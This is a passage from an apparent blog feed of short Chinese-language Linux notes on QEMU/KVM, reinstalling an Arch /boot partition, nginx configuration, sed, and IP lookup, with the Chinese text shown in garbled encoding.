ä»ç¡¬ç›˜å¯åŠ¨</li><li><code>d</code>, ä»å…‰é©±å¯åŠ¨</li></ul><p><code>-enable-kvm</code> æ˜¯å¯åŠ¨ kvm æ¨¡å¼.</p><p><code>-monitor stdio</code> è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥ (stdio) è·å–è¾“å…¥æ¥æŒ‡å®šå¯†ç .</p><p><code>-usb -device usb-tablet</code> é€‰é¡¹é¿å…ç‚¹å‡»å®¢æˆ·æœºç³»ç»Ÿçš„çª—å£æ—¶é¼ æ ‡è¢«æ•è·. è‹¥æ²¡æœ‰è¿™ä¸ªé€‰é¡¹, ä½¿ç”¨ <code>Ctrl+Alt+g</code> æ¥æ”¾å¼€æ•è·.</p><p>è¿™é‡Œä¸ºä»€ä¹ˆè¦åŠ  <code>-m 10G</code>, å¯èƒ½æ˜¯å› ä¸ºå®‰è£…ç³»ç»Ÿçš„æ—¶å€™æ‰€å çš„ç©ºé—´å¤§äº 128MB.</p><h2 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h2><p>å°è¯•äº†ä¸€ä¸‹çš„å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64  -cdrom ubuntu-22.04.1-live-server-amd64.iso -boot order=d -drive file=ubuntu22.qcow2 -enable-kvm -m 10G<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncviewer :5900<br></code></pre></td></tr></table></figure><p>è®¿é—®.</p><p>æç¤ºé‡Œé¢è¯´ç”¨ <code>::1:5900</code> è®¿é—®, ä½†ä¸è¡Œ.</p><p>è¿™é‡Œæ˜¯å®‰è£…ç³»ç»Ÿ. å®‰è£…å®Œä¹‹åé€€å‡º, ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -m 10G ubuntu22.qcow2<br></code></pre></td></tr></table></figure><p>é‡æ–°è¿›å…¥ç³»ç»Ÿ, è¿™é‡Œä¹Ÿè¦æŒ‡å®š <code>-m</code>.</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://computingforgeeks.com/install-kvm-qemu-virt-manager-arch-manjar/">å‚è€ƒ</a></h1>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-ä¸­å…³äº-Qt-éƒ¨åˆ†</title>
    <link href="/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Qt-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Qt-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Qt">ArchWiki</a><br>Qt æ˜¯ä¸€ä¸ªè·¨å¹³å°çš„åº”ç”¨ç¨‹åºå’Œå›¾å½¢ç»„ä»¶å·¥å…·åŒ…, ä½¿ç”¨æ ‡å‡† C++, åŒæ—¶å¯¹ C++ ä½œå‡ºäº†åŠŸèƒ½æ‰©å±•, é€šè¿‡ä½¿ç”¨ç‰¹åˆ«çš„ä»£ç ç”Ÿæˆå™¨ä»¥åŠæ•°ä¸ªå®æ¥æ‰©å±•è¯­è¨€çš„åŠŸèƒ½.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Archlinux-è¯¯åˆ -boot-å¯åŠ¨åˆ†åŒºåé‡æ–°å®‰è£…åˆ†åŒº</title>
    <link href="/2022/09/30/%E5%85%B3%E4%BA%8E-Archlinux-%E8%AF%AF%E5%88%A0-boot-%E5%90%AF%E5%8A%A8%E5%88%86%E5%8C%BA%E5%90%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%88%86%E5%8C%BA/"/>
    <url>/2022/09/30/%E5%85%B3%E4%BA%8E-Archlinux-%E8%AF%AF%E5%88%A0-boot-%E5%90%AF%E5%8A%A8%E5%88%86%E5%8C%BA%E5%90%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%88%86%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="å…·ä½“æ­¥éª¤"><a href="#å…·ä½“æ­¥éª¤" class="headerlink" title="å…·ä½“æ­¥éª¤"></a>å…·ä½“æ­¥éª¤</h1><h2 id="æ–°å»º-boot-åˆ†åŒº"><a href="#æ–°å»º-boot-åˆ†åŒº" class="headerlink" title="æ–°å»º /boot åˆ†åŒº"></a>æ–°å»º <code>/boot</code> åˆ†åŒº</h2><p>å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ <code>/boot</code> åˆ†åŒº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fdisk -l<br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ©ç”¨ <code>fdisk</code> åˆ›å»ºä¸€ä¸ª <code>/boot</code> åˆ†åŒº, å¤§å°ä¸º <code>1G</code> å·¦å³.</p><h2 id="æŒ‚è½½"><a href="#æŒ‚è½½" class="headerlink" title="æŒ‚è½½"></a>æŒ‚è½½</h2><p>å’Œå®‰è£…æ—¶å·®ä¸å¤š, å…ˆæŒ‚åœ¨ <code>/</code> æ ¹ç›®å½•æ‰€åœ¨åˆ†åŒº, å†æŒ‚è½½ <code>/boot</code> åˆ†åŒº. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mount /dev/nvme0n1p6 /mnt<br>$ mount /dev/nvme0n1p8 /mnt/boot<br></code></pre></td></tr></table></figure><p>ç„¶åç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨æ¥è‡ªåŠ¨æŒ‚è½½åˆ†åŒº, å¯ä»¥å…ˆåˆ é™¤åŸå…ˆçš„:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…å†…æ ¸"><a href="#å®‰è£…å†…æ ¸" class="headerlink" title="å®‰è£…å†…æ ¸"></a>å®‰è£…å†…æ ¸</h2><p>éœ€è¦é‡æ–°å®‰è£… linux å†…æ ¸:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ arch-chroot /mnt<br>$ pacman -S base linux linux-firmware<br></code></pre></td></tr></table></figure><p>å¯èƒ½éœ€è¦å…ˆä¿®æ”¹ <code>/etc/pacman.d/mirrorlist</code> ä¸­çš„é¡ºåº.</p><h2 id="å®‰è£…å¼•å¯¼"><a href="#å®‰è£…å¼•å¯¼" class="headerlink" title="å®‰è£…å¼•å¯¼"></a>å®‰è£…å¼•å¯¼</h2><p>å…ˆå®‰è£…å¾½ç  (è¿™é‡Œæ˜¯ intel), å®é™…ä¸Šè¿™ä¸ªæ²¡æœ‰è¢«åˆ é™¤, å¯èƒ½ä¸º <code>reinstall</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pacman -S intel-ucode<br></code></pre></td></tr></table></figure><p>è£…å¼•å¯¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch --recheck<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="é€€å‡ºå¹¶é‡å¯"><a href="#é€€å‡ºå¹¶é‡å¯" class="headerlink" title="é€€å‡ºå¹¶é‡å¯"></a>é€€å‡ºå¹¶é‡å¯</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">exit</span><br>$ umount -R /mnt<br>$ reboot<br></code></pre></td></tr></table></figure><p>å°± ok äº†.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºå®¹å™¨è¿›å…¥åä»ç„¶æ˜¯-bash-shell</title>
    <link href="/2022/09/30/%E5%85%B3%E4%BA%8E%E5%AE%B9%E5%99%A8%E8%BF%9B%E5%85%A5%E5%90%8E%E4%BB%8D%E7%84%B6%E6%98%AF-bash-shell/"/>
    <url>/2022/09/30/%E5%85%B3%E4%BA%8E%E5%AE%B9%E5%99%A8%E8%BF%9B%E5%85%A5%E5%90%8E%E4%BB%8D%E7%84%B6%E6%98%AF-bash-shell/</url>
    
    <content type="html"><![CDATA[<p>åŸå› æ˜¯ <code>docker run</code> çš„æ—¶å€™, åé¢çš„å‘½ä»¤æ˜¯ <code>/bin/bash</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-bash-Unexpect-end-of-file-error-è¿™ä¸€æŠ¥é”™</title>
    <link href="/2022/09/30/%E8%A7%A3%E5%86%B3-bash-Unexpect-end-of-file-error-%E8%BF%99%E4%B8%80%E6%8A%A5%E9%94%99/"/>
    <url>/2022/09/30/%E8%A7%A3%E5%86%B3-bash-Unexpect-end-of-file-error-%E8%BF%99%E4%B8%80%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™æ—¶å¯èƒ½è¯´çš„æ˜¯æ–‡ä»¶çš„ç»“å°¾, ä½†å®é™…ä¸Š, å‡ºé”™çš„åœ°æ–¹ä¸åœ¨æ–‡ä»¶çš„ç»“å°¾, è€Œåœ¨è„šæœ¬ä¹‹ä¸­.</p><p>åŸå› ä¸º <code>if</code> æ²¡æœ‰ç”¨ <code>fi</code> ç»“å°¾è¿™ä¸€ç±».</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS-æ‹›æ–°é¢˜æ€»ç»“</title>
    <link href="/2022/09/30/CNSS-%E6%8B%9B%E6%96%B0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2022/09/30/CNSS-%E6%8B%9B%E6%96%B0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="æ‡’äººç¦éŸ³"><a href="#æ‡’äººç¦éŸ³" class="headerlink" title="æ‡’äººç¦éŸ³"></a>æ‡’äººç¦éŸ³</h1><p>ç”±äºä» gitee ä¸Šé¢ clone ç§äººä»“åº“éœ€è¦å¸å·å¯†ç , shell ä¼šæŠ¥é”™.</p><h1 id="èŒæ–°ä¹Ÿæƒ³æ­è½½ä¸ŠX-å¼•æ“"><a href="#èŒæ–°ä¹Ÿæƒ³æ­è½½ä¸ŠX-å¼•æ“" class="headerlink" title="èŒæ–°ä¹Ÿæƒ³æ­è½½ä¸ŠX-å¼•æ“"></a>èŒæ–°ä¹Ÿæƒ³æ­è½½ä¸ŠX-å¼•æ“</h1><p>Docker å®¹å™¨æ‰“å¼€çš„ç«¯å£ä¼šéšæœºæ˜ å°„åˆ°å®¿ä¸»æœºä¸Šçš„æŸä¸ªç«¯å£.</p><p>ä¸ä»…å¯ä»¥é€šè¿‡ <code>localhost:ç«¯å£å·</code> æ¥æ‰“å¼€é¡µé¢.</p><p>æŸ¥çœ‹äº† docker å®¹å™¨çš„ ip åœ°ä¹‹å, å¯ä»¥ç›´æ¥ç”¨ docker å®¹å™¨çš„ ip åœ°å€è®¿é—®.</p><h2 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h2><p>åœ¨ nginx é…ç½®æ–‡ä»¶ä¸­, å°±ç®—ä¸å†™ location éƒ¨åˆ†, å¦‚æœä½ çŸ¥é“æ–‡ä»¶å, è¿˜æ˜¯å¯ä»¥è®¿é—®åˆ°æ–‡ä»¶.</p><h3 id="æ¯ä¸ªç«¯å£å¼€æ”¾ä¸€ä¸ªç½‘é¡µ"><a href="#æ¯ä¸ªç«¯å£å¼€æ”¾ä¸€ä¸ªç½‘é¡µ" class="headerlink" title="æ¯ä¸ªç«¯å£å¼€æ”¾ä¸€ä¸ªç½‘é¡µ"></a>æ¯ä¸ªç«¯å£å¼€æ”¾ä¸€ä¸ªç½‘é¡µ</h3><p>è¿™ä¸ªå°±è¦ç”¨ <code>deny</code> æŒ‡ä»¤, å°†å…¶ä»–æ‰€æœ‰ä¹Ÿé¡µé¢çš„è®¿é—®ç¦æ­¢æ‰.</p><h3 id="å…³äº-autoindex"><a href="#å…³äº-autoindex" class="headerlink" title="å…³äº autoindex"></a>å…³äº autoindex</h3><p>å¦‚æœè®¾ç½®äº†é»˜è®¤ç•Œé¢, è¿™ä¸ªé€‰é¡¹å°±ä¸èµ·ä½œç”¨.</p><p>å¦‚æœæ–‡ä»¶ä¸ºå‹ç¼©æ–‡ä»¶, ç‚¹å‡»åå°±å¯ä»¥ä¸‹è½½.</p><h3 id="å…³äº-server-éƒ¨åˆ†çš„å†ç†è§£"><a href="#å…³äº-server-éƒ¨åˆ†çš„å†ç†è§£" class="headerlink" title="å…³äº server éƒ¨åˆ†çš„å†ç†è§£"></a>å…³äº server éƒ¨åˆ†çš„å†ç†è§£</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>    <span class="hljs-number">80</span>;    <span class="hljs-comment"># è¿™ä¸ªæ˜¯ç›‘å¬æœ¬åœ°çš„ 80 ç«¯å£</span><br>    <span class="hljs-attribute">server_name</span>     test.com    <span class="hljs-comment"># è¿™ä¸ªæ˜¯ç”¨æ¥åŒ¹é…çš„ä¸€ä¸ªåŸŸå, èµ·åˆ°è¿‡æ»¤ä½œç”¨</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹ <code>server_name</code> çš„è§£é‡Š, å…ˆæ˜¯ nginx æ‰€åœ¨çš„æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚, ç„¶åç”¨ <code>server_name</code> æ¥æ¯”å¯¹è¿™ä¸ªè¯·æ±‚ä¸Šé¢çš„åŸŸå, æ‰€ä»¥è¿™ä¸ªè¿˜æ˜¯ç”¨æ¥åŒ¹é…, åº”è¯¥æ˜¯åŒ¹é…æˆåŠŸäº†æ‰ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤.</p><h3 id="å…³äºåå‘ä»£ç†çš„-proxy-pass-æŒ‡ä»¤"><a href="#å…³äºåå‘ä»£ç†çš„-proxy-pass-æŒ‡ä»¤" class="headerlink" title="å…³äºåå‘ä»£ç†çš„ proxy_pass æŒ‡ä»¤"></a>å…³äºåå‘ä»£ç†çš„ <code>proxy_pass</code> æŒ‡ä»¤</h3><p>è¿™ä¸ªå¿…é¡»è¦åŠ ä¸Šåè®®, ä¸èƒ½åªå†™åŸŸåæˆ– IP.</p><p>æ¯”å¦‚è¦è®¿é—®åˆ° baidu, å°±å†™:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">proxy_pass https:<span class="hljs-regexp">//</span>baidu.com;<br></code></pre></td></tr></table></figure><h3 id="å…³äº-location"><a href="#å…³äº-location" class="headerlink" title="å…³äº location"></a>å…³äº location</h3><p>location éƒ¨åˆ†åªèƒ½å†™åœ¨ server é‡Œé¢.</p><h3 id="å¯¹æ‰€æœ‰-server-å—çš„å…¨å±€é…ç½®"><a href="#å¯¹æ‰€æœ‰-server-å—çš„å…¨å±€é…ç½®" class="headerlink" title="å¯¹æ‰€æœ‰ server å—çš„å…¨å±€é…ç½®"></a>å¯¹æ‰€æœ‰ server å—çš„å…¨å±€é…ç½®</h3><p>å†™åœ¨æ‰€æœ‰ server å—ä¹‹å¤–å°±å¥½äº†.</p><h3 id="å…³äº-return-å‘½ä»¤çš„ç”¨æ³•"><a href="#å…³äº-return-å‘½ä»¤çš„ç”¨æ³•" class="headerlink" title="å…³äº return å‘½ä»¤çš„ç”¨æ³•"></a>å…³äº return å‘½ä»¤çš„ç”¨æ³•</h3><p>å¯è¿”å›çŠ¶æ€ç , å˜é‡å€¼, å®ç°åŸŸåè·³è½¬.</p><p>å¦‚:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">    return</span> <span class="hljs-number">302</span> https://www.baidu.com<br>&#125;<br></code></pre></td></tr></table></figure><p>å°±æ˜¯ç›´æ¥è·³è½¬åˆ° baidu.</p>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-sed-çš„ä¸€äº›æŠ€å·§</title>
    <link href="/2022/09/29/%E5%85%B3%E4%BA%8E-sed-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/09/29/%E5%85%B3%E4%BA%8E-sed-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="ä½¿ç”¨-çš„ä½œç”¨"><a href="#ä½¿ç”¨-çš„ä½œç”¨" class="headerlink" title="ä½¿ç”¨ {} çš„ä½œç”¨"></a>ä½¿ç”¨ <code>&#123;&#125;</code> çš„ä½œç”¨</h1><p>ä¸»è¦ç›®çš„å°±æ˜¯ä¸ºäº†ä½¿ <mark>å¯»å€</mark> ä½œç”¨äºå¤šæ¡å‘½ä»¤.</p><h1 id="ç”¨åˆ°-åæ–œçº¿çš„åœ°æ–¹"><a href="#ç”¨åˆ°-åæ–œçº¿çš„åœ°æ–¹" class="headerlink" title="ç”¨åˆ° \ åæ–œçº¿çš„åœ°æ–¹"></a>ç”¨åˆ° <code>\</code> åæ–œçº¿çš„åœ°æ–¹</h1><p>åªæœ‰ <code>i\</code> (insert), <code>a\</code> (append), <code>c\</code> (change), è¿™ä¸‰ä¸ªåœ°æ–¹ç”¨åˆ°äº†åæ–œçº¿.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³-Warning-Could-not-build-optimal-types_hash-é—®é¢˜</title>
    <link href="/2022/09/29/%E8%A7%A3%E5%86%B3-Warning-Could-not-build-optimal-types-hash-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/29/%E8%A7%A3%E5%86%B3-Warning-Could-not-build-optimal-types-hash-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>æå‡ <code>http</code> ä»£ç å—çš„ä¸‹é¢çš„é”®çš„å€¼:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">    http &#123;<br>    types_hash_max_size <span class="hljs-number">4096</span><span class="hljs-comment">;</span><br>    server_names_hash_bucket_size <span class="hljs-number">128</span><span class="hljs-comment">;</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Bç«™-nginx-èµ„æ–™</title>
    <link href="/2022/09/29/B%E7%AB%99-nginx-%E8%B5%84%E6%96%99/"/>
    <url>/2022/09/29/B%E7%AB%99-nginx-%E8%B5%84%E6%96%99/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1"><a href="#å‚è€ƒ1" class="headerlink" title="å‚è€ƒ1"></a><a href="https://b23.tv/A8Z8w53">å‚è€ƒ1</a></h1><p>æ¶æ„, åŠ å±‚å¤„ç†.</p><h2 id="åŠŸèƒ½å’Œéƒ¨åˆ†æ¦‚å¿µ"><a href="#åŠŸèƒ½å’Œéƒ¨åˆ†æ¦‚å¿µ" class="headerlink" title="åŠŸèƒ½å’Œéƒ¨åˆ†æ¦‚å¿µ"></a>åŠŸèƒ½å’Œéƒ¨åˆ†æ¦‚å¿µ</h2><h3 id="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†"><a href="#æ­£å‘ä»£ç†å’Œåå‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†"></a>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†</h3><p>æ­£å‘ä»£ç†, ä»£ç†å®¢æˆ·ç«¯. å®¢æˆ·ç«¯çš„è¯·æ±‚ä»ä»£ç†å¤„å‘ç»™æœåŠ¡å™¨.</p><p>åå‘ä»£ç†, ä»£ç†æœåŠ¡ç«¯. å°±å¦‚åŒå‘æˆ‘ä»¬å‘ <code>www.baidu.com</code> è®¿é—®, åªæœ‰è¿™ä¸€ä¸ªåŸŸå, å®é™…ä¸Šåé¢æœ‰å¾ˆå¤šæœåŠ¡å™¨.</p><h3 id="è´Ÿè½½å‡è¡¡"><a href="#è´Ÿè½½å‡è¡¡" class="headerlink" title="è´Ÿè½½å‡è¡¡"></a>è´Ÿè½½å‡è¡¡</h3><p>è½®å¾ª, ä¸€ä¸ªä¸€ä¸ªåˆ†é…è¯·æ±‚.</p><p>åŠ æƒè½®å¾ª, é€šè¿‡æƒé‡æ¥åˆ†é…è¯·æ±‚.</p><h3 id="iphash"><a href="#iphash" class="headerlink" title="iphash"></a>iphash</h3><p>æ¥è‡ªä¸€ä¸ª ip çš„è¯·æ±‚ä¼šå§‹ç»ˆä¼ é€åˆ°åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Š (è§£å†³ä¼šè¯æ— æ³•å…±äº«å¯¼è‡´çš„é—®é¢˜).</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>åšç¼“å­˜æœåŠ¡å™¨ä»¥åŠ Session å…±äº«.</p><h3 id="é™æ€èµ„æºæœåŠ¡å™¨"><a href="#é™æ€èµ„æºæœåŠ¡å™¨" class="headerlink" title="é™æ€èµ„æºæœåŠ¡å™¨"></a>é™æ€èµ„æºæœåŠ¡å™¨</h3><h2 id="è®²è§£"><a href="#è®²è§£" class="headerlink" title="è®²è§£"></a>è®²è§£</h2><p>80 ç«¯å£æ˜¯ http çš„é»˜è®¤ç«¯å£, æ‰€ä»¥å¯ä»¥çœç•¥ä¸å†™.</p><p>åœ¨æ‰“å¼€ nginx ä¹‹åå°±å¯ä»¥åœ¨ localhost:80 å¤„æŸ¥çœ‹. åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°ç«¯å£ä½ç½®.</p><p>è®¿é—®æ—¶éœ€æŸ¥çœ‹ 80 ç«¯å£æ˜¯å¦å¼€å¯. æ˜¯å¦è®¾ç½®äº†é˜²ç«å¢™ä»¥åŠæ˜¯å¦è¢«å ç”¨.</p><p>nginx çš„ç«¯å£å·é…ç½®åˆ°ä»»ä½•ä¸€ä¸ªåœ°æ–¹éƒ½æ˜¯å¯ä»¥çš„.</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>æœ‰å…¨å±€é…ç½®éƒ¨åˆ†.</p><h1 id="å‚è€ƒ2"><a href="#å‚è€ƒ2" class="headerlink" title="å‚è€ƒ2"></a><a href="https://b23.tv/fTxRPw7">å‚è€ƒ2</a></h1><p>æ‰“å¼€ä¸€ä¸ªç½‘é¡µ, ç”¨ <code>F12</code> è¿›å…¥å¼€å‘è€…æ¨¡å¼, ç‚¹å‡» Network, æŸ¥çœ‹ Reaponse Headers ä¸­çš„ server é¡¹, å¯ä»¥çŸ¥é“è¿™ä¸ªç½‘é¡µæ˜¯ç”¨ä»€ä¹ˆæ­å»ºçš„.</p><p>åå‘ä»£ç†, å°†è¯·æ±‚åˆ†å‘åˆ°å…¬å¸çš„å¤šå°æœåŠ¡å™¨ä¸Š.</p><p>openresty, åœ¨ nginx çš„åŸºç¡€ä¸Šé›†æˆäº†å¾ˆå¤šç¬¬ä¸‰æ–¹æ’ä»¶. å…¶åŸºäº nginx å’Œ lua.</p><h2 id="å…³äºé…ç½®æ–‡ä»¶"><a href="#å…³äºé…ç½®æ–‡ä»¶" class="headerlink" title="å…³äºé…ç½®æ–‡ä»¶"></a>å…³äºé…ç½®æ–‡ä»¶</h2><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> localhost;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span> html;<br>        <span class="hljs-attribute">index</span> index.html index.htm;<br>    &#125;<br><br>    <span class="hljs-attribute">error_page</span>  <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /50x.html;<br>    <span class="hljs-section">location</span> /50x.html &#123;<br>        <span class="hljs-attribute">root</span> html;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>index</code> è¡¨æ˜, å¦‚æœä½ æ²¡æœ‰æä¾›æ–‡ä»¶å, å°±ä¼šé»˜è®¤è®¿é—®çš„æ–‡ä»¶, è¿™é‡Œä¸º <code>html/index.html</code></p><p><code>error_page</code> è¡¨ç¤ºé”™è¯¯é¡µ.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹-IP-æ˜¯å±äºå“ªä¸ªå›½å®¶å’Œåœ°åŒº</title>
    <link href="/2022/09/28/%E6%9F%A5%E7%9C%8B-IP-%E6%98%AF%E5%B1%9E%E4%BA%8E%E5%93%AA%E4%B8%AA%E5%9B%BD%E5%AE%B6%E5%92%8C%E5%9C%B0%E5%8C%BA/"/>
    <url>/2022/09/28/%E6%9F%A5%E7%9C%8B-IP-%E6%98%AF%E5%B1%9E%E4%BA%8E%E5%93%AA%E4%B8%AA%E5%9B%BD%E5%AE%B6%E5%92%8C%E5%9C%B0%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://unix.stackexchange.com/questions/7399/ip-to-country-console-command">å‚è€ƒ</a></p><h1 id="æŸ¥çœ‹å…¬æœ‰-ip-åœ°å€"><a href="#æŸ¥çœ‹å…¬æœ‰-ip-åœ°å€" class="headerlink" title="æŸ¥çœ‹å…¬æœ‰ ip åœ°å€"></a>æŸ¥çœ‹å…¬æœ‰ ip åœ°å€</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl http://ifconfig.io<br></code></pre></td></tr></table></figure><p>å…¶è¾“å‡ºä¸€ä¸ª ip åœ°å€.</p><p>æŒ‡å®šä¸€ä¸ª ip æŸ¥è¯¢å…¶ç›¸å…³ä¿¡æ¯:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> ipinfo.io/<span class="hljs-number">23.66.166.151</span><br></code></pre></td></tr></table></figure><p>åé¢æ¥çš„ <code>23.66.166.151</code> æ˜¯ IP åœ°å€. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shell-é‡å®šå‘æ—¶å–åœ°å€ç¬¦çš„å«ä¹‰</title>
    <link href="/2022/09/28/shell-%E9%87%8D%E5%AE%9A%E5%90%91%E6%97%B6%E5%8F%96%E5%9C%B0%E5%9D%80%E7%AC%A6%E7%9A%84%E5%90%AB%E4%B9%89/"/>
    <url>/2022/09/28/shell-%E9%87%8D%E5%AE%9A%E5%90%91%E6%97%B6%E5%8F%96%E5%9C%B0%E5%9D%80%E7%AC%A6%E7%9A%84%E5%90%AB%E4%B9%89/</url>
    
